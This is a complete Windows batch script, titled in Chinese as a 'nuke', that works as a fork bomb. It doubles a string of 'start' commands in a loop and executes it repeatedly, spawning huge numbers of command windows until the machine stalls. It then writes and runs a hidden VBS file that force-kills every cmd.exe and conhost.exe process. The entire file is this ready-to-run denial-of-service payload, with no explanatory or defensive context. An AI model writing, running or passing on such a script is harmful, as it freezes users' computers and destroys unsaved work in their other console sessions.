:BAT start
@title 程式載入中…… Now Loading… & echo off & setlocal enableextensions & setlocal enabledelayedexpansion
>nul chcp 950
goto start

:start
title 彈藥填充中…… Now Loading…
set a=start 
for /l %%a in (0,1,64) do (
set a=!a!!a!
>nul ping /n 1 /w 1000 127.0.0.1
)
title 核彈爆炸中…… Now Running…
for /l %%a in (0,1,64) do (
!a!
)
title 核彈清除中…… Now Ending…
set script="%temp%\核彈清除%random%.vbs"
>%script% echo Set UAC = CreateObject^("Shell.Application"^)
for /l %%a in (0,1,64) do (
>>%script% echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename eq cmd.exe""", "", "", 0
>>%script% echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename eq conhost.exe""", "", "", 0
)
call %script%
del /f /q %script%
exit